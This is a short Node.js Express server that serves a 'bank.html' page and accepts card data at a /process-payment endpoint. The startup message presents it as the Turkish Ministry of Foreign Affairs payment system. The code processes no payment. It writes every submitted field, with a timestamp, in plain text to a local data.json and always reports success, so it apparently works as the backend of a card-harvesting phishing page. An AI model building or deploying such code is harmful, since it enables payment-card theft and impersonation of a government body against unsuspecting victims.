const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'bank.html'));
});

app.post('/process-payment', (req, res) => {
    const cardData = req.body;
    cardData.timestamp = new Date().toISOString();
    const filePath = path.join(__dirname, 'data.json');

    fs.readFile(filePath, 'utf8', (err, data) => {
        let json = [];
        if (!err && data) {
            try { json = JSON.parse(data); } catch (e) { json = []; }
        }
        json.push(cardData);
        fs.writeFile(filePath, JSON.stringify(json, null, 4), (writeErr) => {
            if (writeErr) return res.status(500).json({ status: 'error' });
            res.json({ status: 'success' });
        });
    });
});

app.listen(3000, () => {
    console.log('🔥 T.C. Dışişleri Bakanlığı Ödeme Sistemi Aktif: http://test-site.local:3000');
});
